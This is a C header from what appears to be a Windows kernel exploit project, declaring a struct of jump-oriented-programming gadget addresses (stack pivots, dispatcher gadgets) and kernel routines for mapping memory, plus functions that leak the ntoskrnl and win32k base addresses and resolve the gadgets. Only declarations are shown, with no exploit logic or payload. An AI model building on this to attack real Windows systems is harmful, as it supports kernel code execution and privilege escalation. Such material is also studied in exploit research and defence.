#ifndef JOP_GADGETS_H
#define JOP_GADGETS_H

#include <Windows.h>
#include <stdbool.h>
#include <stddef.h>

typedef struct _GadgetsData
{
    size_t longjump;
    size_t longjump_internal;
    size_t jump_dispatcher;
    size_t push_rax_jmp_rbx;
    size_t call_rbp_jmp_deref_rsi;
    size_t mov_rcx_r13_call_rax;
    size_t load_first_arguments_from_stack;
    size_t stack;
    size_t ntoskrnl;
    size_t win32ksgd;
    size_t sgd_get_user_session_state;
    size_t add_rsp_jmp_rax;
    size_t call_rax_load_regs_jmp_rax;
    size_t pop_rax_jmp_deref_rsi;
    size_t save_rax_rsi;
    size_t add_rsp_pop_rbp;
    size_t add_gadget;
    size_t io_allocate_mdl;
    size_t memcpy;
    size_t mm_probe_and_lock_pages;
    size_t mm_map_locked_pages_specify_cache;
    size_t zw_terminate_thread;
    size_t pop_rsp_ret;
    size_t add_rsp_pop_rsi_ret;
    size_t add_rsp_jmp_r8;
} GadgetsData;

bool gadgets_get_ntosknrl_base_address(
    size_t *ntoskrnl_base, size_t *win32ksgd_base, size_t *stack_address, HANDLE child_pipe
);
bool gadgets_resolve_all_gadgets(
    size_t ntoskrnl_base,
    size_t stack_address,
    size_t win32kbase_base,
    GadgetsData **gadgets,
    HANDLE child_pipe
);

#endif